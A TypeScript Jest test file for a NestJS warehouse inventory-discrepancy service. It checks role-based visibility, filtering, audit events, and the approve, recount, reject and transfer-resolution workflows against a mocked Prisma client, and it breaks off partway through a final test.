import {
  BadRequestException,
  ConflictException,
  ForbiddenException,
  NotFoundException,
} from "@nestjs/common";
import {
  DiscrepancyAuditAction,
  DiscrepancyReason,
  DiscrepancySeverity,
  DiscrepancyStatus,
  TaskStatus,
  UserRole,
} from "@prisma/client";

import { PrismaService } from "../prisma/prisma.service";
import type { AuthenticatedUser } from "../auth/auth-user";
import { DiscrepanciesService } from "./discrepancies.service";
import { DiscrepancyRulesService } from "./discrepancy-rules.service";
import { DiscrepancyAuditService } from "./discrepancy-audit.service";
import { InventoryRulesEngine } from "../inventory/rules/inventory-rules.engine";
import { NotificationsService } from "../notifications/notifications.service";

const workerActor: AuthenticatedUser = {
  subject: "sub-worker",
  username: "wh101",
  email: "worker@keycloak.local",
  roles: ["worker"],
};

const managerActor: AuthenticatedUser = {
  subject: "sub-manager",
  username: "mg101",
  email: "manager@keycloak.local",
  roles: ["manager"],
};

function createPrismaMock(overrides: {
  workerId?: string;
  managerId?: string;
  discrepancyStatus?: DiscrepancyStatus;
} = {}) {
  const workerId = overrides.workerId ?? "user-worker-1";
  const managerId = overrides.managerId ?? "user-manager-1";
  const discrepancyStatus = overrides.discrepancyStatus ?? DiscrepancyStatus.AWAITING_REVIEW;

  const discrepancyFindMany = jest.fn(async () => []);
  const discrepancyCount = jest.fn(async () => 0);
  const discrepancyGroupBy = jest.fn(async () => []);
  const discrepancyFindUnique = jest.fn(async () => null);
  const discrepancyCreate = jest.fn(async (args: unknown) => ({
    id: "disc-1",
    caseNumber: "DSC-20260810-0001",
    ...(args as { data?: object }).data,
  }));
  const discrepancyUpdate = jest.fn(async (args: unknown) => ({
    id: "disc-1",
    caseNumber: "DSC-20260810-0001",
    ...(args as { data?: object }).data,
  }));
  const discrepancyUpdateMany = jest.fn(async () => ({ count: 1 }));
  const auditEventCreate = jest.fn(async (args: unknown) => ({
    id: "audit-1",
    ...(args as { data?: object }).data,
  }));
  const auditEventCount = jest.fn(async () => 0);
  const auditEventFindMany = jest.fn(async () => [] as unknown);
  const userFindUnique = jest.fn(
    async ({ where }: { where: { email?: string; employeeId?: string } }) => {
      if (where.email === "worker@keycloak.local") {
        return { id: workerId, role: UserRole.WORKER };
      }
      if (where.email === "manager@keycloak.local") {
        return { id: managerId, role: UserRole.MANAGER };
      }
      return null;
    },
  );
  const userCreate = jest.fn(async () => ({ id: "user-created", role: UserRole.WORKER }));
  const balanceFindUnique = jest.fn(async () => ({
    id: "balance-1",
    productId: "prod-1",
    locationId: "loc-1",
    quantity: 100,
  }));
  const balanceUpsert = jest.fn(async (args: unknown) => ({
    id: "balance-1",
    ...(args as { data?: object }).data,
  }));
  const balanceUpdate = jest.fn(async (args: unknown) => ({
    id: "balance-1",
    ...(args as { data?: object }).data,
  }));
  const transactionUpdate = jest.fn(async (args: unknown) => ({
    id: "tx-1",
    status: DiscrepancyStatus.APPROVED,
    ...(args as { data?: object }).data,
  }));
  const transactionCreate = jest.fn(async (args: unknown) => ({
    id: "tx-transfer-1",
    ...(args as { data?: object }).data,
  }));
  const transactionFindMany = jest.fn(async () => []);
  const taskCreate = jest.fn(async (args: unknown) => ({
    id: "task-1",
    ...(args as { data?: object }).data,
  }));
  const taskFindUnique: jest.Mock = jest.fn(async () => null);
  const taskUpdateMany: jest.Mock = jest.fn(async () => ({ count: 1 }));
  const locationFindFirst = jest.fn(async () => null);
  const productFindMany = jest.fn(async () => []);
  const userFindMany = jest.fn(async () => []);
  const notificationCreate = jest.fn(async () => ({}));
  const notificationCreateMany = jest.fn(async () => ({ count: 0 }));

  const prisma = {
    discrepancy: {
      findMany: discrepancyFindMany,
      count: discrepancyCount,
      groupBy: discrepancyGroupBy,
      findUnique: discrepancyFindUnique,
      create: discrepancyCreate,
      update: discrepancyUpdate,
      updateMany: discrepancyUpdateMany,
    },
    discrepancyAuditEvent: {
      create: auditEventCreate,
      count: auditEventCount,
      findMany: auditEventFindMany,
    },
    user: { findUnique: userFindUnique, create: userCreate, findMany: userFindMany },
    inventoryBalance: {
      findUnique: balanceFindUnique,
      upsert: balanceUpsert,
      update: balanceUpdate,
    },
    inventoryTransaction: {
      findUnique: jest.fn(async () => null),
      update: transactionUpdate,
      create: transactionCreate,
      findMany: transactionFindMany,
    },
    inventoryTask: {
      create: taskCreate,
      findUnique: taskFindUnique,
      update: jest.fn(async () => ({})),
      updateMany: taskUpdateMany,
    },
    location: { findFirst: locationFindFirst, findMany: jest.fn(async () => []) },
    product: { findMany: productFindMany },
    notification: {
      create: notificationCreate,
      createMany: notificationCreateMany,
    },
    $transaction: jest.fn(async (callback: (client: unknown) => Promise<unknown>) =>
      callback(prisma),
    ),
  } as unknown as PrismaService & {
    discrepancy: {
      findUnique: jest.Mock;
      update: jest.Mock;
      updateMany: jest.Mock;
      groupBy: jest.Mock;
      count: jest.Mock;
      create: jest.Mock;
    };
    discrepancyAuditEvent: { create: jest.Mock; count: jest.Mock; findMany: jest.Mock };
    inventoryBalance: { findUnique: jest.Mock; upsert: jest.Mock; update: jest.Mock };
    inventoryTransaction: {
      findUnique: jest.Mock;
      update: jest.Mock;
      create: jest.Mock;
      findMany: jest.Mock;
    };
    inventoryTask: { create: jest.Mock; findUnique: jest.Mock; update: jest.Mock; updateMany: jest.Mock };
    location: { findFirst: jest.Mock; findMany: jest.Mock };
    product: { findMany: jest.Mock };
    user: { findUnique: jest.Mock; create: jest.Mock; findMany: jest.Mock };
    notification: { create: jest.Mock; createMany: jest.Mock };
    $transaction: jest.Mock;
  };

  const notifications = {
    createForUser: jest.fn(async () => ({})),
    createForManagers: jest.fn(async () => undefined),
  } as unknown as NotificationsService;

  const service = new DiscrepanciesService(
    prisma,
    new DiscrepancyRulesService(),
    notifications,
    new InventoryRulesEngine(),
    new DiscrepancyAuditService(),
  );

  /** Make findOne/decisions return a case with this status. */
  function setDiscrepancy(partial: Record<string, unknown> = {}) {
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      caseNumber: "DSC-20260810-0001",
      transactionId: "tx-1",
      productId: "prod-1",
      locationId: "loc-1",
      expectedQuantity: 100,
      countedQuantity: 115,
      differenceQuantity: 15,
      differencePercentage: 15,
      severity: DiscrepancySeverity.MAJOR,
      status: discrepancyStatus,
      reasonCode: DiscrepancyReason.COUNT_DIFFERENCE,
      workerId,
      assignedManagerId: null,
      recountTaskId: null,
      resolutionTransactionId: null,
      resolvedById: null,
      resolvedAt: null,
      createdAt: new Date("2026-08-10T10:00:00Z"),
      updatedAt: new Date("2026-08-10T10:00:00Z"),
      worker: { id: workerId, employeeId: "WH101", displayName: "Worker One" },
      product: { id: "prod-1", name: "Bottle", sku: "BTL-01" },
      location: { id: "loc-1", name: "Storage", code: "STO" },
      transaction: {
        id: "tx-1",
        action: "CYCLE_COUNT",
        status: "PENDING",
        transcript: "Counted one hundred fifteen Bottles.",
      },
      ...partial,
    });
    return prisma;
  }

  return {
    prisma,
    notifications,
    service,
    workerId,
    managerId,
    setDiscrepancy,
    auditEventCount,
    auditEventCreate,
    auditEventFindMany,
    taskFindUnique,
    taskUpdateMany,
  };
}

describe("DiscrepanciesService — role visibility", () => {
  test("workers only see their own discrepancy cases", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(workerActor, {});
    expect(prisma.discrepancy.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({ workerId: "user-worker-1" }),
      }),
    );
  });

  test("a worker-provided workerId filter is ignored (cannot inspect other workers)", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(workerActor, { workerId: "user-other-worker" });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.workerId).toBe("user-worker-1");
  });

  test("managers may see all warehouse discrepancies and can filter by worker", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { workerId: "user-any-worker" });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.workerId).toBe("user-any-worker");
  });

  test("managers see all cases when no worker filter is provided", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, {});
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.workerId).toBeUndefined();
  });
});

describe("DiscrepanciesService — pagination, filtering and sorting", () => {
  test("applies page and pageSize with correct skip/take", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { page: 3, pageSize: 25 });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.skip).toBe(50);
    expect(args.take).toBe(25);
  });

  test("filters by severity and status", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, {
      severity: DiscrepancySeverity.CRITICAL,
      status: DiscrepancyStatus.AWAITING_REVIEW,
    });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.severity).toBe(DiscrepancySeverity.CRITICAL);
    expect(args.where.status).toBe(DiscrepancyStatus.AWAITING_REVIEW);
  });

  test("filters positive and negative differences", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { difference: "POSITIVE" });
    let args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.differenceQuantity).toEqual({ gt: 0 });
    await service.list(managerActor, { difference: "NEGATIVE" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[1][0];
    expect(args.where.differenceQuantity).toEqual({ lt: 0 });
  });

  test("maps dashboard summary views to exact database filters", async () => {
    const { prisma, service } = createPrismaMock();

    await service.list(managerActor, { view: "OPEN" });
    let args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.status).toBe(DiscrepancyStatus.AWAITING_REVIEW);

    await service.list(managerActor, { view: "AWAITING_RECOUNT" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[1][0];
    expect(args.where.status).toBe(DiscrepancyStatus.RECOUNT_REQUESTED);

    await service.list(managerActor, { view: "HIGH_PRIORITY" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[2][0];
    expect(args.where.severity).toEqual({
      in: [DiscrepancySeverity.MAJOR, DiscrepancySeverity.CRITICAL],
    });

    await service.list(managerActor, { view: "MISSING" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[3][0];
    expect(args.where.differenceQuantity).toEqual({ lt: 0 });
    expect(args.where.status.in).toEqual(
      expect.arrayContaining([
        DiscrepancyStatus.OPEN,
        DiscrepancyStatus.AWAITING_REVIEW,
        DiscrepancyStatus.RECOUNT_REQUESTED,
      ]),
    );

    await service.list(managerActor, { view: "EXTRA" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[4][0];
    expect(args.where.differenceQuantity).toEqual({ gt: 0 });
  });

  test("resolved-today dashboard view filters by the resolution timestamp", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { view: "RESOLVED_TODAY" });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.resolvedAt.gte).toBeInstanceOf(Date);
    expect(args.where.resolvedAt.lt).toBeInstanceOf(Date);
    expect(args.where.resolvedAt.lt.getTime()).toBeGreaterThan(
      args.where.resolvedAt.gte.getTime(),
    );
  });

  test("filters by date range", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { from: "2026-08-01", to: "2026-08-10" });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.createdAt).toEqual({
      gte: new Date("2026-08-01"),
      lte: new Date("2026-08-10"),
    });
  });

  test("sorts by createdAt descending by default", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, {});
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.orderBy).toEqual({ createdAt: "desc" });
  });

  test("applies the requested order direction to the chosen sort field", async () => {
    const { prisma, service } = createPrismaMock();
    await service.list(managerActor, { sort: "differenceQuantity", order: "desc" });
    let args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.orderBy).toEqual({ differenceQuantity: "desc" });
    await service.list(managerActor, { sort: "caseNumber", order: "asc" });
    args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[1][0];
    expect(args.orderBy).toEqual({ caseNumber: "asc" });
  });
});

describe("DiscrepanciesService — findOne visibility and review-opened audit", () => {
  test("workers cannot view another worker's discrepancy", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      workerId: "user-other",
      caseNumber: "DSC-20260810-0001",
      status: DiscrepancyStatus.AWAITING_REVIEW,
    });
    await expect(service.findOne("disc-1", workerActor)).rejects.toThrow(
      ForbiddenException,
    );
  });

  test("managers can view any worker's discrepancy", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      workerId: "user-other",
      caseNumber: "DSC-20260810-0001",
      status: DiscrepancyStatus.APPROVED,
    });
    const result = await service.findOne("disc-1", managerActor);
    expect(result).toMatchObject({ id: "disc-1", caseNumber: "DSC-20260810-0001" });
  });

  test("missing discrepancy returns 404", async () => {
    const { service } = createPrismaMock();
    await expect(service.findOne("disc-missing", managerActor)).rejects.toThrow(
      NotFoundException,
    );
  });

  test("first manager open of an undecided case records REVIEW_OPENED once", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      caseNumber: "DSC-20260810-0001",
      workerId: "user-worker-1",
      status: DiscrepancyStatus.AWAITING_REVIEW,
      expectedQuantity: 100,
      countedQuantity: 115,
      differenceQuantity: 15,
    });
    await service.findOne("disc-1", managerActor);
    expect(prisma.discrepancyAuditEvent.count).toHaveBeenCalled();
    expect(prisma.discrepancyAuditEvent.create).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({
          action: DiscrepancyAuditAction.REVIEW_OPENED,
        }),
      }),
    );
  });

  test("REVIEW_OPENED is not duplicated when already recorded", async () => {
    const { prisma, service, auditEventCount } = createPrismaMock();
    auditEventCount.mockResolvedValue(1);
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      caseNumber: "DSC-20260810-0001",
      workerId: "user-worker-1",
      status: DiscrepancyStatus.AWAITING_REVIEW,
      expectedQuantity: 100,
      countedQuantity: 115,
      differenceQuantity: 15,
    });
    await service.findOne("disc-1", managerActor);
    expect(prisma.discrepancyAuditEvent.create).not.toHaveBeenCalled();
  });
});

describe("DiscrepanciesService — atomic creation, audit trail and duplicate prevention", () => {
  test("creates a discrepancy with correct calculated fields and COUNT_DIFFERENCE reason", async () => {
    const { prisma, service } = createPrismaMock();
    const result = await service.createForCycleCount(prisma as never, {
      transactionId: "tx-1",
      productId: "prod-1",
      locationId: "loc-1",
      expectedQuantity: 100,
      countedQuantity: 115,
      workerId: "user-worker-1",
      workerNotes: "Counted on the shelf.",
    });
    expect(prisma.discrepancy.create).toHaveBeenCalled();
    const callArgs = (prisma.discrepancy.create as jest.Mock).mock.calls[0][0];
    expect(callArgs.data.caseNumber).toMatch(/^DSC-\d{8}-\d{4}$/);
    expect(callArgs.data.transactionId).toBe("tx-1");
    expect(callArgs.data.expectedQuantity).toBe(100);
    expect(callArgs.data.countedQuantity).toBe(115);
    expect(callArgs.data.differenceQuantity).toBe(15);
    expect(callArgs.data.differencePercentage).toBe(15);
    expect(callArgs.data.severity).toBe(DiscrepancySeverity.MAJOR);
    expect(callArgs.data.status).toBe(DiscrepancyStatus.AWAITING_REVIEW);
    expect(callArgs.data.reasonCode).toBe(DiscrepancyReason.COUNT_DIFFERENCE);
    expect(result).toMatchObject({ id: "disc-1" });
  });

  test("stores the deterministic severity rule that produced the classification", async () => {
    const { prisma, service } = createPrismaMock();
    await service.createForCycleCount(prisma as never, {
      transactionId: "tx-1",
      productId: "prod-1",
      locationId: "loc-1",
      expectedQuantity: 100,
      countedQuantity: 115,
      workerId: "user-worker-1",
    });
    const callArgs = (prisma.discrepancy.create as jest.Mock).mock.calls[0][0];
    expect(callArgs.data.severityRule).toContain("15 units (15%)");
    const auditEvents = (prisma.discrepancyAuditEvent.create as jest.Mock).mock.calls.map(
      (call) => (call[0] as { data: { severityRule?: string } }).data.severityRule,
    );
    expect(auditEvents[0]).toContain("15 units (15%)");
    expect(auditEvents[1]).toContain("15 units (15%)");
  });

  test("writes append-only CASE_CREATED and WORKER_CONFIRMED audit events", async () => {
    const { prisma, service, auditEventCreate } = createPrismaMock();
    await service.createForCycleCount(prisma as never, {
      transactionId: "tx-1",
      productId: "prod-1",
      locationId: "loc-1",
      expectedQuantity: 100,
      countedQuantity: 115,
      workerId: "user-worker-1",
      transcript: "Counted one hundred fifteen Bottles.",
    });
    const actions = auditEventCreate.mock.calls.map(
      (call) => (call[0] as { data: { action: string } }).data.action,
    );
    expect(actions).toEqual([
      DiscrepancyAuditAction.CASE_CREATED,
      DiscrepancyAuditAction.WORKER_CONFIRMED,
    ]);
    const first = (auditEventCreate.mock.calls[0][0] as { data: object }).data;
    expect(first).toEqual(
      expect.objectContaining({
        caseNumber: expect.stringMatching(/^DSC-\d{8}-0001$/),
        expectedQuantity: 100,
        countedQuantity: 115,
        differenceQuantity: 15,
        actorWorkerId: "user-worker-1",
        rawTranscript: "Counted one hundred fifteen Bottles.",
      }),
    );
  });

  test("expected quantity always comes from the database, never the client", async () => {
    const { prisma, service } = createPrismaMock();
    await service.createForCycleCount(prisma as never, {
      transactionId: "tx-1",
      productId: "prod-1",
      locationId: "loc-1",
      expectedQuantity: 100,
      countedQuantity: 98,
      workerId: "user-worker-1",
    });
    const callArgs = (prisma.discrepancy.create as jest.Mock).mock.calls[0][0];
    expect(callArgs.data.expectedQuantity).toBe(100);
    expect(callArgs.data.differenceQuantity).toBe(-2);
  });

  test("a transaction rolls back when discrepancy creation fails", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.create as jest.Mock) = jest.fn(async () => {
      throw new Error("duplicate transactionId");
    });
    await expect(
      service.createForCycleCount(prisma as never, {
        transactionId: "tx-1",
        productId: "prod-1",
        locationId: "loc-1",
        expectedQuantity: 10,
        countedQuantity: 12,
        workerId: "user-worker-1",
      }),
    ).rejects.toThrow("duplicate transactionId");
  });
});

describe("DiscrepanciesService — approve", () => {
  test("approves atomically: balance set to counted, ledger posts, audit written, worker notified", async () => {
    const { prisma, notifications, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy();
    await service.approve("disc-1", { note: "Confirmed on shelf." }, managerActor);

    expect(prisma.discrepancy.update).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({ status: DiscrepancyStatus.APPROVED }),
      }),
    );
    expect(prisma.inventoryBalance.upsert).toHaveBeenCalledWith(
      expect.objectContaining({
        update: expect.objectContaining({ quantity: 115 }),
      }),
    );
    expect(prisma.inventoryTransaction.update).toHaveBeenCalled();
    expect(prisma.discrepancy.update).toHaveBeenCalled();
    expect(notifications.createForUser).toHaveBeenCalledWith(
      expect.anything(),
      expect.objectContaining({ userId: "user-worker-1" }),
    );
    const auditActions = (prisma.discrepancyAuditEvent.create as jest.Mock).mock.calls.map(
      (call) => (call[0] as { data: { action: string } }).data.action,
    );
    expect(auditActions).toContain(DiscrepancyAuditAction.APPROVED);
    expect(auditActions).toContain(DiscrepancyAuditAction.CASE_CLOSED);
  });

  test("prevents duplicate approval on an already-approved case", async () => {
    const { service, setDiscrepancy } = createPrismaMock({ discrepancyStatus: DiscrepancyStatus.APPROVED });
    setDiscrepancy();
    await expect(
      service.approve("disc-1", { note: "Again" }, managerActor),
    ).rejects.toThrow(ConflictException);
  });

  test("denies approval to workers with 403", async () => {
    const { service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy();
    await expect(
      service.approve("disc-1", { note: "Counted" }, workerActor),
    ).rejects.toThrow(ForbiddenException);
  });
});

describe("DiscrepanciesService — request recount", () => {
  test("creates a linked recount task, marks RECOUNT_REQUESTED and audits", async () => {
    const { prisma, notifications, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy();
    await service.requestRecount(
      "disc-1",
      { instructions: "Count the full shelf again." },
      managerActor,
    );
    expect(prisma.inventoryTask.create).toHaveBeenCalled();
    const taskArgs = (prisma.inventoryTask.create as jest.Mock).mock.calls[0][0];
    expect(taskArgs.data.type).toBe("RECOUNT");
    expect(taskArgs.data.sourceTransactionId).toBe("tx-1");
    expect(prisma.discrepancy.update).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({
          status: DiscrepancyStatus.RECOUNT_REQUESTED,
          recountTaskId: "task-1",
        }),
      }),
    );
    expect(notifications.createForUser).toHaveBeenCalled();
    const actions = (prisma.discrepancyAuditEvent.create as jest.Mock).mock.calls.map(
      (call) => (call[0] as { data: { action: string } }).data.action,
    );
    expect(actions).toContain(DiscrepancyAuditAction.RECOUNT_REQUESTED);
  });

  test("refuses a second recount while an open recount task exists for the case", async () => {
    const { service, setDiscrepancy, taskFindUnique } = createPrismaMock();
    setDiscrepancy({ recountTaskId: "task-1" });
    taskFindUnique.mockResolvedValue({ id: "task-1", status: TaskStatus.OPEN });
    await expect(
      service.requestRecount(
        "disc-1",
        { instructions: "Another recount." },
        managerActor,
      ),
    ).rejects.toThrow(ConflictException);
  });

  test("a recount after a completed task releases the unique source transaction and creates a new task", async () => {
    const { prisma, service, setDiscrepancy, taskFindUnique, taskUpdateMany } =
      createPrismaMock();
    setDiscrepancy({ recountTaskId: "task-1" });
    taskFindUnique.mockResolvedValue({ id: "task-1", status: TaskStatus.COMPLETED });
    await service.requestRecount(
      "disc-1",
      { instructions: "Recount once more." },
      managerActor,
    );
    expect(taskUpdateMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: "task-1" },
        data: expect.objectContaining({ sourceTransactionId: null }),
      }),
    );
    const taskArgs = (prisma.inventoryTask.create as jest.Mock).mock.calls[0][0];
    expect(taskArgs.data.sourceTransactionId).toBe("tx-1");
  });
});

describe("DiscrepanciesService — reject", () => {
  test("rejects without touching stock, closes and audits", async () => {
    const { prisma, notifications, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy();
    await service.reject("disc-1", { reason: "Count could not be confirmed." }, managerActor);
    expect(prisma.discrepancy.update).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({ status: DiscrepancyStatus.REJECTED }),
      }),
    );
    expect(prisma.inventoryBalance.upsert).not.toHaveBeenCalled();
    expect(prisma.inventoryTransaction.update).not.toHaveBeenCalled();
    expect(notifications.createForUser).toHaveBeenCalled();
    const actions = (prisma.discrepancyAuditEvent.create as jest.Mock).mock.calls.map(
      (call) => (call[0] as { data: { action: string } }).data.action,
    );
    expect(actions).toContain(DiscrepancyAuditAction.REJECTED);
    expect(actions).toContain(DiscrepancyAuditAction.CASE_CLOSED);
  });

  test("a repeated reject on a closed case is rejected", async () => {
    const { service, setDiscrepancy } = createPrismaMock({ discrepancyStatus: DiscrepancyStatus.REJECTED });
    setDiscrepancy();
    await expect(
      service.reject("disc-1", { reason: "Again" }, managerActor),
    ).rejects.toThrow(ConflictException);
  });
});

describe("DiscrepanciesService — resolve as transfer", () => {
  test("moves the difference between two locations atomically with audit", async () => {
    const { prisma, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy({ differenceQuantity: -15, countedQuantity: 85 });
    (prisma.location.findFirst as jest.Mock).mockImplementation(async (args: { where: { id: string } }) => ({
      id: args.where.id,
      name: args.where.id === "loc-1" ? "Storage" : "Packing",
      code: args.where.id === "loc-1" ? "STO" : "PAC",
    }));
    await service.resolveTransfer(
      "disc-1",
      { sourceLocationId: "loc-1", destinationLocationId: "loc-2", note: "Misplaced." },
      managerActor,
    );
    expect(prisma.discrepancy.update).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({ status: DiscrepancyStatus.RESOLVED_AS_TRANSFER }),
      }),
    );
    expect(prisma.inventoryBalance.update).toHaveBeenCalled();
    expect(prisma.inventoryBalance.upsert).toHaveBeenCalled();
    expect(prisma.inventoryTransaction.create).toHaveBeenCalled();
    expect(prisma.inventoryTransaction.update).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: "tx-1" },
        data: expect.objectContaining({ status: "CANCELLED" }),
      }),
    );
    const txArgs = (prisma.inventoryTransaction.create as jest.Mock).mock.calls[0][0];
    expect(txArgs.data.action).toBe("TRANSFER");
    expect(txArgs.data.quantity).toBe(15);
    expect(txArgs.data.status).toBe("POSTED");
    const actions = (prisma.discrepancyAuditEvent.create as jest.Mock).mock.calls.map(
      (call) => (call[0] as { data: { action: string } }).data.action,
    );
    expect(actions).toContain(DiscrepancyAuditAction.RESOLVED_AS_TRANSFER);
    expect(actions).toContain(DiscrepancyAuditAction.CASE_CLOSED);
  });

  test("rejects identical source and destination locations", async () => {
    const { service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy({ differenceQuantity: -15, countedQuantity: 85 });
    await expect(
      service.resolveTransfer(
        "disc-1",
        { sourceLocationId: "loc-1", destinationLocationId: "loc-1", note: "Same location is invalid." },
        managerActor,
      ),
    ).rejects.toThrow(BadRequestException);
  });

  test("prevents transfer when source stock is insufficient", async () => {
    const { prisma, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy({ differenceQuantity: -15, countedQuantity: 85 });
    (prisma.location.findFirst as jest.Mock).mockImplementation(async (args: { where: { id: string } }) => ({
      id: args.where.id,
      name: "Location",
      code: "LOC",
    }));
    (prisma.inventoryBalance.findUnique as jest.Mock).mockResolvedValue({
      id: "balance-1",
      quantity: 5,
    });
    await expect(
      service.resolveTransfer(
        "disc-1",
        { sourceLocationId: "loc-1", destinationLocationId: "loc-2", note: "Move misplaced stock." },
        managerActor,
      ),
    ).rejects.toThrow(ConflictException);
  });

  test("moves a correct quantity from its recorded location to the physical count location without increasing total stock", async () => {
    const { prisma, service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy({
      locationId: "storage-1",
      expectedQuantity: 0,
      countedQuantity: 100,
      differenceQuantity: 100,
      differencePercentage: 100,
      location: { id: "storage-1", name: "Storage 1", code: "L004" },
      product: { id: "prod-1", name: "Helmet", sku: "ITEM-104" },
    });
    (prisma.location.findFirst as jest.Mock).mockImplementation(
      async (args: { where: { id: string } }) => ({
        id: args.where.id,
        name: args.where.id === "packing" ? "Packing" : "Storage 1",
        code: args.where.id === "packing" ? "L002" : "L004",
      }),
    );
    (prisma.inventoryBalance.findUnique as jest.Mock).mockImplementation(
      async (args: { where: { productId_locationId: { locationId: string } } }) =>
        args.where.productId_locationId.locationId === "packing"
          ? { quantity: 100 }
          : { quantity: 0 },
    );

    await service.resolveTransfer(
      "disc-1",
      {
        sourceLocationId: "packing",
        destinationLocationId: "storage-1",
        note: "Helmet stock was found in Storage 1 but recorded in Packing.",
      },
      managerActor,
    );

    expect(prisma.inventoryBalance.update).toHaveBeenCalledWith(
      expect.objectContaining({
        where: {
          productId_locationId: {
            productId: "prod-1",
            locationId: "packing",
          },
        },
        data: { quantity: { decrement: 100 } },
      }),
    );
    expect(prisma.inventoryBalance.upsert).toHaveBeenCalledWith(
      expect.objectContaining({
        where: {
          productId_locationId: {
            productId: "prod-1",
            locationId: "storage-1",
          },
        },
        update: { quantity: { increment: 100 } },
      }),
    );
    const transferArgs = (prisma.inventoryTransaction.create as jest.Mock).mock.calls[0][0];
    expect(transferArgs.data).toEqual(
      expect.objectContaining({
        action: "TRANSFER",
        status: "POSTED",
        quantity: 100,
        sourceLocationId: "packing",
        destinationLocationId: "storage-1",
        systemQuantityBefore: 100,
      }),
    );
    expect(transferArgs.data.notes).toContain("total 100 → 100");
    const resolutionArgs = (prisma.discrepancy.update as jest.Mock).mock.calls.find(
      (call) => call[0]?.data?.status === DiscrepancyStatus.RESOLVED_AS_TRANSFER,
    )?.[0];
    expect(resolutionArgs.data.resolutionTransactionId).toBe("tx-transfer-1");
  });

  test("rejects an unrelated destination for an extra-stock discrepancy", async () => {
    const { service, setDiscrepancy } = createPrismaMock();
    setDiscrepancy({
      locationId: "storage-1",
      expectedQuantity: 0,
      countedQuantity: 100,
      differenceQuantity: 100,
    });
    await expect(
      service.resolveTransfer(
        "disc-1",
        {
          sourceLocationId: "packing",
          destinationLocationId: "dispatch",
          note: "Invalid unrelated destination.",
        },
        managerActor,
      ),
    ).rejects.toThrow(BadRequestException);
  });

  test("a repeated transfer on a resolved case is rejected", async () => {
    const { service, setDiscrepancy } = createPrismaMock({
      discrepancyStatus: DiscrepancyStatus.RESOLVED_AS_TRANSFER,
    });
    setDiscrepancy();
    await expect(
      service.resolveTransfer(
        "disc-1",
        {
          sourceLocationId: "loc-1",
          destinationLocationId: "loc-2",
          note: "Again.",
        },
        managerActor,
      ),
    ).rejects.toThrow(ConflictException);
  });
});

describe("DiscrepanciesService — append-only audit history", () => {
  test("audit() lists events oldest first for an authorized viewer", async () => {
    const { prisma, service, auditEventFindMany } = createPrismaMock();
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
      caseNumber: "DSC-20260810-0001",
      workerId: "user-worker-1",
    });
    auditEventFindMany.mockResolvedValue([
      { id: "a1", action: DiscrepancyAuditAction.CASE_CREATED },
      { id: "a2", action: DiscrepancyAuditAction.APPROVED },
    ]);
    const events = await service.audit("disc-1", workerActor);
    expect(events).toHaveLength(2);
    expect(auditEventFindMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { discrepancyId: "disc-1" },
        orderBy: { createdAt: "asc" },
      }),
    );
  });

  test("a worker cannot read another worker's case history", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findUnique as jest.Mock).mockResolvedValue({
      id: "disc-1",
